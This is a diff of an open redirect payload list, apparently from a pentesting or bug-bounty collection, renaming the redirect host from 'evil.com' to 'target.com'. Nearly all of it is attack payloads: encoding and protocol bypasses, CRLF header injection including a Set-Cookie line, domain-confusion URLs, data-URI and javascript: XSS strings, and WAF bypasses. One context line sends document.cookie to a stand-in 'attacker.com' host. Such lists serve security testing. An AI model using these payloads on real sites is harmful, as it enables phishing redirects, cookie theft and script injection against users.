@@ -9,73 +9,73 @@ redirect, redirect_to, redirecturi, redirect_uri, return, returnurl, returnUri, 
 # Comprehensive Open Redirect Payload List
 
 ## Basic Payloads
-https://evil.com
-//evil.com
-\/\/evil.com
-evil.com
+https://target.com
+//target.com
+\/\/target.com
+target.com
 
 ## Protocol Bypass Techniques
-https:evil.com
-http:\/\/evil.com
-https:\/\/evil.com
-\\evil.com
-http:\\evil.com
+https:target.com
+http:\/\/target.com
+https:\/\/target.com
+\\target.com
+http:\\target.com
 
 ## Character Encoding
-%0D%0Ahttp://evil.com
-%09//evil.com
-/%09/evil.com
-/%5Cevil.com
-//%0D%0Aevil.com
-/%2F%2Fevil.com
-/%5C%5Cevil.com
-\/evil.com
-.evil.com
+%0D%0Ahttp://target.com
+%09//target.com
+/%09/target.com
+/%5Ctarget.com
+//%0D%0Atarget.com
+/%2F%2Ftarget.com
+/%5C%5Ctarget.com
+\/target.com
+.target.com
 
 ## URL Encoding Variations
-%68%74%74%70%73%3A%2F%2Fevil.com        # https://evil.com URL encoded
-%68%74%74%70%3A%2F%2Fevil.com           # http://evil.com URL encoded
+%68%74%74%70%73%3A%2F%2Ftarget.com        # https://target.com URL encoded
+%68%74%74%70%3A%2F%2Ftarget.com           # http://target.com URL encoded
 
 ## Double Encoding
-%252F%252Fevil.com
-%252F%252F%252F%252Fevil.com
+%252F%252Ftarget.com
+%252F%252F%252F%252Ftarget.com
 
 ## Protocol Relative Bypass
-http:evil.com
-https:evil.com
+http:target.com
+https:target.com
 javascript:alert(document.domain)
 
 ## CRLF Injection Attempts
 %0D%0A%0D%0A<img src=x onerror=alert(document.domain)>
-%0d%0aLocation:https://evil.com
+%0d%0aLocation:https://target.com
 %0d%0aSet-Cookie:sessionid=123
 
 ## Domain Confusion
-https://evil.com@legitimate-site.com
-https://legitimate-site.com.evil.com
-https://legitimate-site.com%40evil.com
-https://legitimate-site.com%2F%2Fevil.com
-https://legitimate-site.com%252F%252Fevil.com
-https://evil.com%23.legitimate-site.com
-https://evil.com%3F.legitimate-site.com
+https://target.com@legitimate-site.com
+https://legitimate-site.com.target.com
+https://legitimate-site.com%40target.com
+https://legitimate-site.com%2F%2Ftarget.com
+https://legitimate-site.com%252F%252Ftarget.com
+https://target.com%23.legitimate-site.com
+https://target.com%3F.legitimate-site.com
 
 ## Data URI Scheme
-data:text/html,<script>window.location='https://evil.com'</script>
+data:text/html,<script>window.location='https://target.com'</script>
 data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==
 
 ## Null Byte and Fragment
-https://evil.com%00https://legitimate-site.com
-https://evil.com%2500https://legitimate-site.com
-https://evil.com#https://legitimate-site.com
+https://target.com%00https://legitimate-site.com
+https://target.com%2500https://legitimate-site.com
+https://target.com#https://legitimate-site.com
 
 ## Special Characters
 javascript://%0aalert(document.cookie)
 javascript://%0Aalert(document.cookie)
-//evil.com
-////evil.com
-///\@evil.com
-\/\/evil.com/
-/\/evil.com/
+//target.com
+////target.com
+///\@target.com
+\/\/target.com/
+/\/target.com/
 javascript:alert(document.domain)
 
 ## Advanced XSS Through Redirects
@@ -84,8 +84,8 @@ javascript:fetch('//attacker.com/?cookie='+document.cookie)
 javascript://%0Aalert(document.cookie)
 
 ## Multi-Level Redirects
-https://example.com/redirect?url=https://evil.com/redirect?url=https://malicious.com
-https://example.com/redirect?url=data:text/html,<script>window.location='https://evil.com'</script>
+https://example.com/redirect?url=https://target.com/redirect?url=https://malicious.com
+https://example.com/redirect?url=data:text/html,<script>window.location='https://target.com'</script>
 
 ## Common WAF Bypass
 javascripT://alert(document.domain)
